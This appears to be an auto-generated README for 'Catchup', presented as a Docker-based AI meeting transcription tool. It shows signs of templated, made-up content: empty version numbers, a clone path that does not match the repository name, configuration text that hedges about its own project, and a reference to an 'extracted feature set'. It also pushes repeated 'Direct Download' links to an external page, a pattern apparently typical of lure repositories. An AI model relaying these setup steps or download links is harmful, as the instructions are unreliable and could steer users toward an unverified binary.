# Catchup - AI meeting transcription tool 2026

> **Catchup is a Docker-based AI meeting transcription tool that turns spoken meetings into structured output with speaker diarization, live microphone recording, and document generation in the current release.**

[![Platform](https://img.shields.io/badge/Platform-Docker-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/efisher74/catchup-win-21423?style=flat-square)](https://github.com/efisher74/catchup-win-21423)

---

<p align="center">
  <a href="https://efisher74.github.io/catchup-win-21423/">
    <img src="https://img.shields.io/badge/Download-Catchup%20Latest-brightgreen?style=for-the-badge" alt="Download Catchup">
  </a>
</p>

> **[Direct Download - Catchup v](https://efisher74.github.io/catchup-win-21423/)**

---

[Download Latest Build](https://efisher74.github.io/catchup-win-21423/)

---

## About Catchup

Catchup is designed to help teams and individuals turn meetings into usable text and documents without a heavy manual process. It focuses on AI transcription for meeting content, making it easier to review conversations, search for key moments, and keep a record of what was discussed.

The tool also supports speaker diarization, which helps distinguish who said what during a session. With live microphone recording and document generation in the workflow, Catchup can fit into note-taking, recap creation, and content handoff tasks where structured meeting output matters.

---

## Features

- AI-powered meeting transcription
- Speaker diarization for multi-speaker sessions
- Live microphone recording support
- Document generation from meeting content
- Docker-based deployment
- Built for meeting workflows and summaries
- Useful for review, archiving, and follow-up notes

---

## Installation

Clone or download the repository, then run it through Docker.

    git clone https://github.com/efisher74/catchup-win-21423.git
    cd catchup
    docker compose up -d

If you are using a different Docker setup, start the container using the compose file or your preferred Docker workflow after pulling the project.

---

## Usage

Start the container, open the application, and begin a meeting session or upload the audio source you want transcribed. If you are recording live, select the microphone input and let Catchup capture the conversation as it happens.

Typical workflow:
1. Launch the Docker service.
2. Record or provide the meeting audio.
3. Review the transcription and speaker labels.
4. Generate the document output for sharing or storage.

---

## Configuration

Catchup settings are typically managed through the Docker setup and project files in the repository. If the project exposes environment variables or compose options, update them before starting the container.

Example pattern:

    # docker-compose.yml or environment file
    TRANSCRIPTION_MODE=meeting
    ENABLE_DIARIZATION=true
    MIC_INPUT=default

Adjust configuration according to your deployment and the workflow you want to run.

---

## Requirements

- Docker
- A system capable of running containerized applications
- Access to a microphone for live recording use cases
- Storage for audio files, transcripts, and generated documents
- A compatible browser or local interface for interacting with the tool

---

## FAQ

**How do I get updates?**  
Pull the latest repository changes and rebuild or restart the Docker container when a new release or revision is available.

**Where are settings changed?**  
Check the Docker compose file, environment variables, and any project configuration files included in the repository.

**What if transcription or recording does not start?**  
Verify Docker is running, confirm microphone permissions or input selection, and review the container logs for startup issues.

**Can I use it for multiple speakers?**  
Yes, speaker diarization is part of the extracted feature set and is intended to help separate voices in a meeting.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
